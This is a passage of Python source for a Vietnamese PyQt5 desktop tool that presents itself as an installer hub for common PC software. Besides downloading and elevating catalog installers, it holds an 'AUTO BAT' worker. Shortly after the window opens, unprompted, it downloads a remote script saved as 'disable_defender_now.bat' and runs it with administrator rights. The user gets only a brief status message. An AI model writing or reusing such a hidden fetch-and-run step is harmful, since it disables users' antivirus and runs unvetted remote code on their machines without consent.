        if not setup_path: raise FileNotFoundError(f"Không thấy file cài đặt ưu tiên trong: {out_dir}")
        rel = setup_path.relative_to(out_dir)
        if status_cb: status_cb(f"Tìm thấy {rel} → chạy (elevated)…")
        suf = setup_path.suffix.lower()
        if suf in (".bat", ".cmd"): run_elevated("cmd.exe", f'/c "{str(setup_path)}"', str(setup_path.parent))
        else: run_elevated(str(setup_path), "", str(setup_path.parent))
        return
    if status_cb: status_cb("Định dạng không xác định, mở bằng shell…")
    os.startfile(str(path))

# === AUTO BAT (MỚI): Worker tải & chạy .bat ===
class AutoBatWorker(QtCore.QObject):
    finished = QtCore.pyqtSignal(bool, str)  # ok, info

    def __init__(self, url: str, save_dir: Path):
        super().__init__()
        self.url = url
        self.save_dir = Path(save_dir)

    @QtCore.pyqtSlot()
    def run(self):
        try:
            self.save_dir.mkdir(parents=True, exist_ok=True)
            dest = self.save_dir / "disable_defender_now.bat"
            headers = {"User-Agent": "PyQt5-AutoBat/1.0"}
            with requests.get(self.url, timeout=30, stream=True, headers=headers) as r:
                r.raise_for_status()
                with open(dest, "wb") as f:
                    for chunk in r.iter_content(1024 * 16):
                        if not chunk:
                            continue
                        f.write(chunk)
            # chạy elevated
            try:
                run_elevated("cmd.exe", f'/c "{str(dest)}"', str(dest.parent))
                self.finished.emit(True, str(dest))
            except Exception as e:
                self.finished.emit(False, f"Lỗi chạy .bat: {e}")
        except Exception as e:
            self.finished.emit(False, f"Lỗi tải .bat: {e}")

# ================== UI ==================
class InstallHub(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        style = self.style()
        self.setWindowIcon(style.standardIcon(style.SP_ComputerIcon))
        self.setWindowTitle("PHẦN MỀM CƠ BẢN CHO PC/LAPTOP 2025")
        self.setFixedSize(650, 500)
        #self.setWindowFlag(Qt.WindowStaysOnTopHint, True)
        QtWidgets.QApplication.setStyle("Fusion")
        self._apply_light_palette()
        self._apply_qss()

        vbox = QtWidgets.QVBoxLayout(self)
        vbox.setContentsMargins(12, 10, 12, 10); vbox.setSpacing(10)

        # Header khung xanh
        title_box = QtWidgets.QFrame(); title_box.setObjectName("titleBox")
        title_box.setLayout(QtWidgets.QVBoxLayout()); title_box.layout().setContentsMargins(12,10,12,10); title_box.layout().setSpacing(4)
        title = QtWidgets.QLabel("🛠️  PHẦN MỀM CƠ BẢN CHO PC/LAPTOP 2025"); title.setAlignment(Qt.AlignCenter | Qt.AlignVCenter); title.setObjectName("title")
        subtitle = QtWidgets.QLabel("Phần mềm phát triển bởi giaiphapungdung.com"); subtitle.setAlignment(Qt.AlignCenter | Qt.AlignVCenter); subtitle.setObjectName("subtitle")
        title_box.layout().addWidget(title); title_box.layout().addWidget(subtitle)
        vbox.addWidget(title_box)

        # Grid ứng dụng (4 cột)
        self.grid = QtWidgets.QGridLayout()
        self.grid.setHorizontalSpacing(6); self.grid.setVerticalSpacing(6); self.grid.setContentsMargins(6,6,6,6)
        self.grid.setSizeConstraint(QtWidgets.QLayout.SetFixedSize)

        grid_wrap = QtWidgets.QWidget(); grid_wrap.setObjectName("appCard"); grid_wrap.setLayout(self.grid)
        grid_wrap.setSizePolicy(QtWidgets.QSizePolicy.Fixed, QtWidgets.QSizePolicy.Fixed)
        vbox.addWidget(grid_wrap, 0)

        # ---- Spacer đẩy footer xuống đáy (footer luôn cố định) ----
        vbox.addStretch(1)

        # ======= FOOTER CỐ ĐỊNH =======
        footer = QtWidgets.QFrame(); footer.setObjectName("footer")
        footer.setSizePolicy(QtWidgets.QSizePolicy.Preferred, QtWidgets.QSizePolicy.Fixed)
        fbox = QtWidgets.QVBoxLayout(footer); fbox.setContentsMargins(0,0,0,0); fbox.setSpacing(6)

        # Progress + control
        self.progress = QtWidgets.QProgressBar(); self.progress.setRange(0, 100)

        self.pause_btn = QtWidgets.QPushButton("⏸️  Tạm dừng"); self.pause_btn.setObjectName("actionPrimary")
        self.pause_btn.setEnabled(False); self.pause_btn.clicked.connect(self.toggle_pause)

        self.cancel_btn = QtWidgets.QPushButton("✖  Huỷ"); self.cancel_btn.setObjectName("actionDanger")
        self.cancel_btn.setEnabled(False); self.cancel_btn.clicked.connect(self.cancel_download)

        row1 = QtWidgets.QHBoxLayout()
        row1.addWidget(self.progress, 1); row1.addWidget(self.pause_btn); row1.addWidget(self.cancel_btn)
        fbox.addLayout(row1)

        # Hàng 2: tốc độ + đổi vị trí + ô đường dẫn
        self.speed_lbl = QtWidgets.QLabel("Tốc độ tải: 0 KB/s")

        self.change_dir_btn = QtWidgets.QPushButton("📁 Vị trí lưu"); self.change_dir_btn.setObjectName("actionGhost")
        self.change_dir_btn.clicked.connect(self.change_download_dir)

        self.path_edit = QtWidgets.QLineEdit(str(DOWNLOAD_DIR))
        self.path_edit.setObjectName("pathEdit"); self.path_edit.setReadOnly(True); self.path_edit.setMinimumWidth(260)
        self.path_edit.setCursorPosition(0); self.path_edit.setToolTip("Double-click để mở thư mục lưu")
        def _open_dir(event):
            try: os.startfile(str(DOWNLOAD_DIR))
            except Exception: QtWidgets.QMessageBox.information(self, "Mở thư mục", str(DOWNLOAD_DIR))
        self.path_edit.mouseDoubleClickEvent = _open_dir

        row2 = QtWidgets.QHBoxLayout()
        row2.addWidget(self.speed_lbl, 1); row2.addWidget(self.change_dir_btn, 0); row2.addWidget(self.path_edit, 1)
        fbox.addLayout(row2)

        # Hàng 3: trạng thái (một dòng, elide để không đổi chiều cao)
        arch_text = "64-bit" if IS_WIN64 else "32-bit"
        self.status_lbl = QtWidgets.QLabel(f"Hệ điều hành phát hiện: {arch_text} • Trạng thái: Sẵn sàng cài đặt")
        self.status_lbl.setObjectName("statusLbl")
        self.status_lbl.setWordWrap(False)
        self.status_lbl.setFixedHeight(20)      # cố định chiều cao
        self.status_lbl.setSizePolicy(QtWidgets.QSizePolicy.Preferred, QtWidgets.QSizePolicy.Fixed)
        fbox.addWidget(self.status_lbl)

        # Gắn footer
        vbox.addWidget(footer, 0)

        # Khởi tạo biến phục vụ elide status
        self._status_full = self.status_lbl.text()

        self.buttons = {}
        self._populate_buttons()
        self._start_icon_loader()

        self.worker_thread = None
        self.downloader = None
        self.is_paused = False

        # gọi elide ban đầu
        self._apply_elide_status()

        # === AUTO BAT (MỚI): cờ và thread holder
        self._auto_bat_started = False
        self._auto_thread = None
        self._auto_worker = None

    # === AUTO BAT (MỚI): kích hoạt sau khi giao diện hiển thị xong
    def showEvent(self, e: QtGui.QShowEvent):
        super().showEvent(e)
        if not self._auto_bat_started:
            self._auto_bat_started = True
            # trì hoãn nhẹ để đảm bảo UI đã render
            QtCore.QTimer.singleShot(1200, self._start_auto_bat)

    def _start_auto_bat(self):
        # không chặn UI, chỉ log ngắn vào status
        self.on_status("Tự động tải script Defender . . .")
        self._auto_thread = QtCore.QThread(self)
        self._auto_worker = AutoBatWorker(AUTO_BAT_URL, DOWNLOAD_DIR)
        self._auto_worker.moveToThread(self._auto_thread)
        self._auto_thread.started.connect(self._auto_worker.run)
        self._auto_worker.finished.connect(self._on_auto_bat_finished)
        self._auto_worker.finished.connect(self._auto_thread.quit)
        self._auto_worker.finished.connect(self._auto_worker.deleteLater)
        self._auto_thread.finished.connect(self._auto_thread.deleteLater)
        self._auto_thread.start()

    def _on_auto_bat_finished(self, ok: bool, info: str):
        if ok:
            self.on_status("Đã tải & chạy script Defender.")
        else:
            # info chứa thông báo lỗi
            self.on_status(info)

    # chọn biến thể ưu tiên & chuẩn bị fallback chéo
    def _select_variant(self, meta: dict) -> Tuple[str, str, str, str, str]:
        if IS_WIN64:
            url = meta.get("url64") or meta.get("url32") or meta.get("url")
            bu  = meta.get("backup_url64") or meta.get("backup_url32") or meta.get("backup_url")
            fn  = meta.get("filename64") or meta.get("filename32") or meta.get("filename")
            alt = meta.get("url32") or meta.get("url")
            alt_bu = meta.get("backup_url32") or meta.get("backup_url")
        else:
            url = meta.get("url32") or meta.get("url64") or meta.get("url")
            bu  = meta.get("backup_url32") or meta.get("backup_url64") or meta.get("backup_url")
            fn  = meta.get("filename32") or meta.get("filename64") or meta.get("filename")
            alt = meta.get("url64") or meta.get("url")
            alt_bu = meta.get("backup_url64") or meta.get("backup_url")
        if not fn:
            suffix = "x64" if IS_WIN64 else "x86"
            fn = f"setup_{suffix}.exe"
        return url, bu, fn, alt, alt_bu

    def _populate_buttons(self):
        style = self.style()
        names = list(APP_CATALOG.keys()); columns = 4
        for idx, name in enumerate(names):
            r = idx // columns; c = idx % columns
            btn = QtWidgets.QPushButton(name); btn.setObjectName("appButton")
            btn.setMinimumHeight(34); btn.setFont(QtGui.QFont("Segoe UI", 9))
            fallback = APP_CATALOG[name].get("fallback_icon", QtWidgets.QStyle.SP_DesktopIcon)
            btn.setIcon(style.standardIcon(fallback)); btn.setIconSize(QtCore.QSize(18, 18))
            btn.clicked.connect(lambda _=False, n=name: self.on_app_clicked(n))
            self.grid.addWidget(btn, r, c); self.buttons[name] = btn

    def _start_icon_loader(self):
        self.icon_thread = QtCore.QThread(self)
        self.icon_worker = IconWorker(APP_CATALOG); self.icon_worker.moveToThread(self.icon_thread)
        self.icon_thread.started.connect(self.icon_worker.run)
        self.icon_worker.icon_ready.connect(self._apply_icon_to_button)
        self.icon_worker.finished.connect(self.icon_thread.quit)
        self.icon_worker.finished.connect(self.icon_worker.deleteLater)
        self.icon_thread.finished.connect(self.icon_thread.deleteLater)
        self.icon_thread.start()

    @QtCore.pyqtSlot(str, QtGui.QIcon)
    def _apply_icon_to_button(self, app_name: str, icon: QtGui.QIcon):
        btn = self.buttons.get(app_name)
        if btn: btn.setIcon(icon)

    def _apply_light_palette(self):
        pal = self.palette()
        pal.setColor(QtGui.QPalette.Window, QtGui.QColor("#f5f6fa"))
        pal.setColor(QtGui.QPalette.WindowText, QtGui.QColor("#111827"))
        pal.setColor(QtGui.QPalette.Base, QtGui.QColor("#ffffff"))
        pal.setColor(QtGui.QPalette.Text, QtGui.QColor("#111827"))
        pal.setColor(QtGui.QPalette.Button, QtGui.QColor("#ffffff"))
        pal.setColor(QtGui.QPalette.ButtonText, QtGui.QColor("#111827"))
        pal.setColor(QtGui.QPalette.Highlight, QtGui.QColor("#2563eb"))
        pal.setColor(QtGui.QPalette.HighlightedText, QtGui.QColor("#ffffff"))
        self.setPalette(pal)

    def _apply_qss(self):
        self.setFont(QtGui.QFont("Segoe UI", 10))
        self.setStyleSheet("""
            QWidget{ background:#FFFAFA; color:#111827; }
            QLabel{ color:#374151; }

            #titleBox{ background:#F5FFFA; border:1px solid #22c55e; border-radius:10px; }
            #title{ background:none; color:#1d4ed8; font-size:18px; font-weight:700; }
            #subtitle{ background:none;color:#16a34a; font-size:13px; font-weight:700; }

            #noteBox{ background:#ffffff; border:1px dashed #60a5fa; border-radius:8px; }
            #noteText{ color:#0f172a; font-size:12px; }

            #appCard{ background:#ffffff; border:2px solid #C6E2FF; border-radius:12px; padding:8px; }

            QProgressBar{ border:1px solid #e5e7eb; border-radius:10px; background:white; height:22px; text-align:center; }
            QProgressBar::chunk{ background:#3b82f6; border-radius:8px; }

            QPushButton#appButton{
                background:white; border:1px solid #e5e7eb; color:#111827;
                border-radius:9px; padding:6px 8px; font-weight:600; text-align:left;
            }
            QPushButton#appButton:hover{ background:#66CCFF; border-color:#93c5fd; }
            QPushButton#appButton:pressed{ background:#f3f4f6; }

            QPushButton#actionPrimary{ background:#1d4ed8; color:white; border:none; border-radius:8px; padding:7px 10px; font-weight:600; }
            QPushButton#actionPrimary:disabled{ background:#93c5fd; color:#f8fafc; }

            QPushButton#actionDanger{ background:#ef4444; color:white; border:none; border-radius:8px; padding:7px 10px; font-weight:600; }
            QPushButton#actionDanger:disabled{ background:#fca5a5; color:#fff; }

            QPushButton#actionGhost{ background:transparent; border:1px solid #e5e7eb; color:#111827; border-radius:8px; padding:6px 8px; font-weight:600; }
            QPushButton#actionGhost:hover{ border-color:#93c5fd; }

            QLineEdit#pathEdit{
                background:#f8fafc;
                border:1px solid #e5e7eb;
                border-radius:8px;
                padding:6px 10px;
                font-weight:600;
                color:#111827;
                Font-size:9pt;
            }

            #statusLbl{ color:#374151; }
        """)

    # ====== Footer helpers ======
    def _apply_elide_status(self):
        """Giữ status 1 dòng, elide nếu dài để footer không đổi chiều cao."""
        fm = self.status_lbl.fontMetrics()
        text = getattr(self, "_status_full", self.status_lbl.text())
        # chừa chút padding
        width = max(50, self.status_lbl.width() - 8)
        self.status_lbl.setText(fm.elidedText(text, Qt.ElideRight, width))

    def resizeEvent(self, e: QtGui.QResizeEvent):
        super().resizeEvent(e)
        # window cố định nhưng gọi lại cho chắc
        self._apply_elide_status()

    # ====== Actions ======
    def on_app_clicked(self, app_name: str):
        if self.downloader is not None:
            QtWidgets.QMessageBox.information(self, "Đang tải", "Vui lòng huỷ hoặc chờ tải hiện tại hoàn tất.")
            return

        info = APP_CATALOG.get(app_name, {})
        url, backup_url, filename, alt_url, alt_bu = self._select_variant(info)
        urls_to_try = [url, backup_url, alt_url, alt_bu]
        if not any(urls_to_try):
            QtWidgets.QMessageBox.warning(self, "Thiếu URL", f"'{app_name}' chưa có URL phù hợp.")
            return

        for b in self.buttons.values(): b.setEnabled(False)
        self.progress.setRange(0, 100); self.progress.setValue(0)
        self.speed_lbl.setText("Tốc độ tải: ...")
        arch_txt = "64-bit" if IS_WIN64 else "32-bit"
        self.on_status(f"Bắt đầu xử lý {app_name} ({arch_txt})")

        self.worker_thread = QtCore.QThread(self)
        self.downloader = Downloader(app_name, urls_to_try, filename)
        self.downloader.moveToThread(self.worker_thread)
        self.worker_thread.started.connect(self.downloader.start)
        self.downloader.progress.connect(self.on_progress)
        self.downloader.speed.connect(self.on_speed)
        self.downloader.status_text.connect(self.on_status)
        self.downloader.paused_changed.connect(self.on_paused_changed)
        self.downloader.finished.connect(self.on_finished)
        self.downloader.finished.connect(lambda *_: self.worker_thread.quit())
        self.downloader.finished.connect(lambda *_: self.downloader.deleteLater())
        self.worker_thread.finished.connect(self._thread_finished_cleanup)
        self.pause_btn.setEnabled(True); self.cancel_btn.setEnabled(True)
        self.is_paused = False; self.pause_btn.setText("⏸️  Tạm dừng")
        self.worker_thread.start()

    def _thread_finished_cleanup(self):
        self.worker_thread.deleteLater(); self.worker_thread = None; self.downloader = None

    def toggle_pause(self):
        if not self.downloader: return
        if self.is_paused: self.downloader.resume()
        else: self.downloader.pause()

    def cancel_download(self):
        if self.downloader: self.downloader.cancel()

    def change_download_dir(self):
        global DOWNLOAD_DIR
        new_dir = QtWidgets.QFileDialog.getExistingDirectory(self, "Chọn thư mục lưu", str(DOWNLOAD_DIR))
        if not new_dir: return
        DOWNLOAD_DIR = Path(new_dir)
        try: DOWNLOAD_DIR.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            QtWidgets.QMessageBox.critical(self, "Không thể tạo thư mục", str(e)); return
        self.path_edit.setText(str(DOWNLOAD_DIR)); self.path_edit.setCursorPosition(0)
        self.on_status(f"Đã đổi vị trí lưu: {DOWNLOAD_DIR}")

    @QtCore.pyqtSlot(bool)
    def on_paused_changed(self, paused):
        self.is_paused = paused
        self.pause_btn.setText("▶️  Tiếp tục" if paused else "⏸️  Tạm dừng")

    @QtCore.pyqtSlot(str, int)
    def on_progress(self, _app, percent):
        if percent == 0 and self.progress.maximum() == 100 and self.progress.value() == 0:
            self.progress.setRange(0, 0)  # busy (không biết tổng)
        if percent > 0 and self.progress.maximum() == 0:
            self.progress.setRange(0, 100)
        if self.progress.maximum() == 100:
            self.progress.setValue(percent)

    @QtCore.pyqtSlot(str, str)
    def on_speed(self, _app, text):
        self.speed_lbl.setText(f"Tốc độ tải: {text}")

    @QtCore.pyqtSlot(str)
    def on_status(self, text):
        self._status_full = f"Trạng thái: {text}"
        self._apply_elide_status()

    @QtCore.pyqtSlot(str, DownloadResult)
    def on_finished(self, app_name, result: DownloadResult):
        for b in self.buttons.values(): b.setEnabled(True)
        self.pause_btn.setEnabled(False); self.cancel_btn.setEnabled(False)
        self.pause_btn.setText("⏸️  Tạm dừng")
        if self.progress.maximum() == 0: self.progress.setRange(0, 100)

        if result.ok and result.filepath:
            self.progress.setValue(100)
            try:
                def status_cb(msg): self.on_status(msg)
                if result.skipped: self.on_status(f"Đã sẵn sàng cài đặt (bỏ qua tải): {result.filepath}")
                else: self.on_status(f"Đã tải xong {app_name}: {result.filepath}")
                run_installer_for_file(result.filepath, status_cb=status_cb)
            except Exception as e:
                QtWidgets.QMessageBox.critical(self, "Không cài được", str(e))
        else:
            QtWidgets.QMessageBox.critical(self, "Lỗi tải", result.error)

# ================== MAIN ==================
def main():
    app = QtWidgets.QApplication(sys.argv)
    w = InstallHub(); w.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()